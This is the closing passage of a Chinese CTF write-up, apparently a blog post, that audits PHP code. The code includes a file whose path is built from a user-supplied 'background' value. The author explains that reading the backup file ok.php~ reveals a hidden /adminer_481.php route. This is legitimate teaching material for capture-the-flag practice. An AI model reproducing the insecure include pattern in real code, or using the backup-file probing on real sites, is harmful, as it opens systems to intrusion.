        <span class="token variable">$check</span><span class="token operator">=</span><span class="token string double-quoted-string">"/var/www/html/"</span><span class="token operator">.</span><span class="token variable">$checkdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'background'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$check</span></span>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">include</span> <span class="token string single-quoted-string">'error.php'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <p>
     审计一下这个代码可以发现
     <code>
      "background"=&gt;"ok"
     </code>
     <br/>
     <code>
      $check="/var/www/html/".$checkdata['background'].".php";
     </code>
     <br/>
     所以也存在一个
     <code>
      ok.php
     </code>
     <br/>
     再看这个
     <code>
      ok.php~
     </code>
     就可以拿到
     <code>
      /adminer_481.php
     </code>
     路由了
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/5210c2fcb7b24672b6968aa18ece93f7.png"/>
    </p>
    <p>
     参考文章
    </p>
    <pre><code>https://www.ctfiot.com/229032.html
https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup/
</code></pre>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f323330325f38303437323930392f:61727469636c652f64657461696c732f313435393337373830" class_="artid" style="display:none">
 </p>
</div>


